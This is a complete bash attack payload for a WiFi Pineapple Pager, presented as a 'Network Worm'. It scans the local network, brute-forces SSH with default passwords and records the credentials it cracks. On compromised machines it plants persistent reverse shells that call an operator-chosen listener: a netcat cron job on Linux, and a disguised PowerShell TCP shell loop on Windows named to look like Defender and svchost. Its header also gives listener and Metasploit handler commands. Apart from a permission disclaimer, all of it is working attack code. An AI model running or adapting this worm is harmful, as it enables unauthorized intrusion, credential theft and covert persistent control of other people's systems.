#!/bin/bash
# Title: Network Worm v1.0 - WiFi Pineapple Pager
# Author: Hackazillarex
# Description: SSH Brute Force + Reverse Shell Deployment
#              Linux: Cron-based netcat reverse shell
#              Windows: schtasks PowerShell reverse shell
#              Supports wlan0cli (WiFi) and eth1 (Ethernet Mod)
#
#  WARNING!!! - This payload is very spicy! I am not responsible for how you
#               intend to use this. Only test on your own equipment or equipment
#               that you have explicit permissions to do so. DON'T BE A SKID!!
#
# PREREQUISITES:
#   sshpass will be automatically installed if not present.
#
# LISTENER SETUP (on your machine but I used iSH app on iPhone in my demo):
#   Single session:
#     nc -lvnp 4444
#
#   Multi-session (netcat loop):
#     while true; do nc -lvnp 4444; done
#
#   Multi-session (socat, all shells at once):
#     socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash
#
#   Multi-session (Metasploit - Linux targets):
#     use exploit/multi/handler
#     set payload cmd/unix/reverse_netcat
#     set LHOST <your IP>
#     set LPORT 4444
#     set ExitOnSession false
#     run -j
#
#   Multi-session (Metasploit - Windows targets):
#     use exploit/multi/handler
#     set payload windows/x64/shell_reverse_tcp
#     set LHOST <your IP>
#     set LPORT 4444
#     set ExitOnSession false
#     run -j
#
# WINDOWS NOTE:
#   Windows targets (empty uname = Windows SSH) get a PowerShell
#   reverse shell deployed via schtasks running every 30 seconds.
#   Task name: "WindowsDefenderUpdate" so it blends in
#
# CLEANUP - The cleanup file will be customized based on what hosts
#           were found.

USB_ETH_ID="0bda:8152"

LOOT_DIR="/root/loot/network_worm"
TIMESTAMP=$(date +%F_%H%M%S)
LOOT_FILE="$LOOT_DIR/worm_$TIMESTAMP.txt"
COMPROMISED_LOG="$LOOT_DIR/compromised_hosts.log"
ERROR_LOG="$LOOT_DIR/error.log"

mkdir -p "$LOOT_DIR"


LOG blue "Network Worm v1.1"
PROMPT_IMAGE ~/payloads/user/exfiltration/Network_Worm/networm.png
LOG green "------------------------------"

# ------------------------------------------------------------------
# Dependency Check - Auto-install sshpass if missing
# ------------------------------------------------------------------

if ! command -v sshpass >/dev/null 2>&1; then
    LOG blue "sshpass not found - installing..."

    opkg update >/dev/null 2>&1
    opkg install sshpass >/dev/null 2>&1

    if ! command -v sshpass >/dev/null 2>&1; then
        LOG red "Failed to install sshpass"
        echo "[$TIMESTAMP] ERROR: sshpass install failed" >> "$ERROR_LOG"
        LED FAIL
        exit 1
    fi

    LOG green "sshpass installed"
fi

# ------------------------------------------------------------------
# Interface Selection - Note: Ethernet Mod may take longer to run
# ------------------------------------------------------------------

IFACE_CHOICE=$(NUMBER_PICKER "Interface: 1=wlan0cli  2=eth1 (Ethernet Mod)" 1)
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LED FAIL; exit 1 ;;
esac

case "$IFACE_CHOICE" in
    2) IFACE="eth1" ;;
    *) IFACE="wlan0cli" ;;
esac

# ------------------------------------------------------------------
# Ethernet Mod Setup (eth1)
# ------------------------------------------------------------------

if [ "$IFACE" = "eth1" ]; then
    LOG blue "Checking USB Ethernet Adapter..."

    if ! lsusb 2>/dev/null | grep -qi "$USB_ETH_ID"; then
        LOG red "USB Ethernet Adapter NOT Found"

        resp=$(CONFIRMATION_DIALOG "USB Adapter not found. Proceed anyway?")
        case $? in
            $DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
                LED FAIL; exit 1 ;;
        esac
        [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { LED FAIL; exit 1; }
    fi

    ip link set "$IFACE" up 2>/dev/null || {
        LOG red "Failed to bring up eth1"
        echo "[$TIMESTAMP] ERROR: ip link set eth1 up failed" >> "$ERROR_LOG"
        LED FAIL; exit 1
    }

sleep 3

    udhcpc -i "$IFACE" -q 2>/dev/null || {
        LOG red "DHCP failed on eth1"
        echo "[$TIMESTAMP] ERROR: udhcpc failed on eth1" >> "$ERROR_LOG"
        LED FAIL; exit 1
    }

    LOG green "eth1 is up"
fi

# ------------------------------------------------------------------
# Listener Configuration - You can customize this prior to uploading to pager
# ------------------------------------------------------------------

LOG blue "Configure Listener IP"

O1=$(NUMBER_PICKER "Listener IP - Octet 1 (default 10)" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) LED FAIL; exit 1 ;; esac

O2=$(NUMBER_PICKER "Listener IP - Octet 2 (default 0)" 0)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) LED FAIL; exit 1 ;; esac

O3=$(NUMBER_PICKER "Listener IP - Octet 3 (default 0)" 0)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) LED FAIL; exit 1 ;; esac

O4=$(NUMBER_PICKER "Listener IP - Octet 4 (default 222)" 222)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) LED FAIL; exit 1 ;; esac

PORT=$(NUMBER_PICKER "Listener Port (default 4444)" 4444)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR) LED FAIL; exit 1 ;; esac

LISTENER_IP="$O1.$O2.$O3.$O4"

LOG green "Listener: $LISTENER_IP:$PORT"

# ------------------------------------------------------------------
# Network Info
# ------------------------------------------------------------------

LOG blue "Detecting Network on $IFACE..."

GATEWAY=$(ip route show dev "$IFACE" | awk '/default/ {print $3}')
NET=$(ip -4 route show dev "$IFACE" | awk '/scope link/ {print $1}')

if [ -z "$GATEWAY" ] || [ -z "$NET" ]; then
    LOG red "Could not detect network on $IFACE"
    echo "[$TIMESTAMP] ERROR: No network detected on $IFACE" >> "$ERROR_LOG"
    LED FAIL
    exit 1
fi

LOG green "Gateway: $GATEWAY"
LOG green "Network: $NET"

# ------------------------------------------------------------------
# Loot Header
# ------------------------------------------------------------------

cat <<EOF > "$LOOT_FILE"
Network Worm v1.0 - Pineapple Pager
By Hackazillarex
=====================================
Timestamp  : $(date)
Interface  : $IFACE
Gateway    : $GATEWAY
Subnet     : $NET
Listener   : $LISTENER_IP:$PORT

--- Scan Results ---
EOF

# ------------------------------------------------------------------
# Host Discovery
# ------------------------------------------------------------------

LOG blue "Scanning for live hosts..."

HOSTS=$(nmap -sn -PR -n -e "$IFACE" "$NET" \
    | awk '/Nmap scan report for/ {print $NF}')

HOST_COUNT=$(echo "$HOSTS" | grep -c .)
LOG green "Found $HOST_COUNT host(s)"

echo "Live Hosts: $HOST_COUNT" >> "$LOOT_FILE"
echo "" >> "$LOOT_FILE"
echo "--- Brute Force Results ---" >> "$LOOT_FILE"

# ------------------------------------------------------------------
# SSH Brute Force + Payload Deployment (Customize creds if needed)
# ------------------------------------------------------------------

CREDENTIALS="root:root root:password root:12345 root:toor admin:admin admin:password admin:12345 test:test oracle:oracle postgres:postgres"

WIN_TASK="WindowsDefenderUpdate"

LOG blue "Starting SSH brute force..."

COMPROMISED=0
CLEANUP_LOG="$LOOT_DIR/cleanup_$TIMESTAMP.txt"

for TARGET_IP in $HOSTS; do
    LOG blue "Trying: $TARGET_IP"

    for CRED in $CREDENTIALS; do
        SSH_USER="${CRED%%:*}"
        SSH_PASS="${CRED##*:}"

        if sshpass -p "$SSH_PASS" ssh \
            -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 \
            -o BatchMode=no \
            "$SSH_USER@$TARGET_IP" \
            "echo ok" >/dev/null 2>&1; then

            # OS Detection - uname returns empty on Windows SSH
            OS=$(sshpass -p "$SSH_PASS" ssh \
                -o StrictHostKeyChecking=no \
                -o ConnectTimeout=3 \
                "$SSH_USER@$TARGET_IP" \
                "uname -s 2>/dev/null" 2>/dev/null | tr -d '\r\n')

            if [ -z "$OS" ]; then
                # Confirm Windows by checking for schtasks
                WIN_CHECK=$(sshpass -p "$SSH_PASS" ssh \
                    -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=3 \
                    "$SSH_USER@$TARGET_IP" \
                    "schtasks /query /tn \"$WIN_TASK\" 2>&1" 2>/dev/null | tr -d '\r')
                # schtasks is available = Windows
                OS="Windows"
            fi

            LOG green "COMPROMISED: $TARGET_IP ($SSH_USER:$SSH_PASS) [$OS]"

            ENTRY="[$TIMESTAMP] HOST: $TARGET_IP | USER: $SSH_USER | PASS: $SSH_PASS | OS: $OS"
            echo "$ENTRY" >> "$COMPROMISED_LOG"
            echo "$ENTRY" >> "$LOOT_FILE"

            if [ "$OS" = "Linux" ]; then
                # ---- Linux: cron + netcat reverse shell ----
                CRON_JOB="* * * * * /bin/nc $LISTENER_IP $PORT -e /bin/sh"
                sshpass -p "$SSH_PASS" ssh \
                    -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=3 \
                    "$SSH_USER@$TARGET_IP" \
                    "(crontab -l 2>/dev/null | grep -v 'nc $LISTENER_IP'; echo '$CRON_JOB') | crontab -" \
                    >/dev/null 2>&1

                LOG green "Cron deployed -> $TARGET_IP"
                echo "  [+] Linux: cron reverse shell deployed" >> "$LOOT_FILE"
                echo "sshpass -p $SSH_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$TARGET_IP \"crontab -l | grep -v 'nc $LISTENER_IP' | crontab -\"" >> "$CLEANUP_LOG"

            elif [ "$OS" = "Windows" ]; then
                # ---- Windows: scp upload .ps1 + SSH background launch ----
                # schtasks has SYSTEM context issues so I had to do the following:
                #   Step 1: write PS script locally, upload via scp
                #   Step 2: SSH launch it backgrounded (&) so scan continues
                WIN_PS1_REMOTE="/Windows/Temp/svchost_update.ps1"
                WIN_PS1_CMD="C:\\Windows\\Temp\\svchost_update.ps1"
                PS1_LOCAL="$LOOT_DIR/win_shell_${TARGET_IP}.ps1"

                # Retry loop so it reconnects if listener isn't up yet
                printf '%s' "while(\$true){try{\$c=New-Object Net.Sockets.TCPClient('$LISTENER_IP',$PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$rb=([text.encoding]::ASCII).GetBytes(\$r+'PS> ');\$s.Write(\$rb,0,\$rb.Length)};\$c.Close()}catch{};Start-Sleep 30}" > "$PS1_LOCAL"

                # Step 1: upload ps1 via scp
                sshpass -p "$SSH_PASS" scp \
                    -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=5 \
                    "$PS1_LOCAL" \
                    "$SSH_USER@$TARGET_IP:$WIN_PS1_REMOTE" \
                    >/dev/null 2>&1

                # Step 2: background the SSH session on the Pager side (&)
                # This lets the scan continue while PS runs through the SSH tunnel
                sshpass -p "$SSH_PASS" ssh \
                    -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=3 \
                    "$SSH_USER@$TARGET_IP" \
                    "powershell -w hidden -nop -f $WIN_PS1_CMD" \
                    >/dev/null 2>&1 &

                LOG green "PS shell launched -> $TARGET_IP"
                echo "  [+] Windows: PS reverse shell launched (retry loop)" >> "$LOOT_FILE"
                echo "sshpass -p $SSH_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$TARGET_IP \"powershell -c 'Get-Process powershell | Stop-Process -Force'\"" >> "$CLEANUP_LOG"
                echo "sshpass -p $SSH_PASS ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $SSH_USER@$TARGET_IP \"del C:\\Windows\\Temp\\svchost_update.ps1\"" >> "$CLEANUP_LOG"

            else
                LOG blue "Unknown OS on $TARGET_IP - skipping payload"
                echo "  [-] Payload skipped (OS: $OS)" >> "$LOOT_FILE"
            fi

            COMPROMISED=$((COMPROMISED + 1))
            break
        fi
    done
done

# ------------------------------------------------------------------
# Summary
# ------------------------------------------------------------------

echo "" >> "$LOOT_FILE"
echo "=== How to Clean Up Your Footsteps ===" >> "$LOOT_FILE"
echo "Run these commands to remove all traces from compromised hosts:" >> "$LOOT_FILE"
echo "" >> "$LOOT_FILE"
if [ -f "$CLEANUP_LOG" ]; then
    cat "$CLEANUP_LOG" >> "$LOOT_FILE"
else
    echo "No cleanup needed (no hosts compromised)" >> "$LOOT_FILE"
fi

echo "" >> "$LOOT_FILE"
echo "=== Summary ===" >> "$LOOT_FILE"
echo "Compromised : $COMPROMISED host(s)" >> "$LOOT_FILE"
echo "Listener    : $LISTENER_IP:$PORT" >> "$LOOT_FILE"
echo "Loot        : $COMPROMISED_LOG" >> "$LOOT_FILE"
echo "Cleanup     : $CLEANUP_LOG" >> "$LOOT_FILE"

LOG blue "Worm complete"
LOG green "Compromised: $COMPROMISED host(s)"
LOG green "Loot saved to $LOOT_DIR"

LED FINISH
exit 0
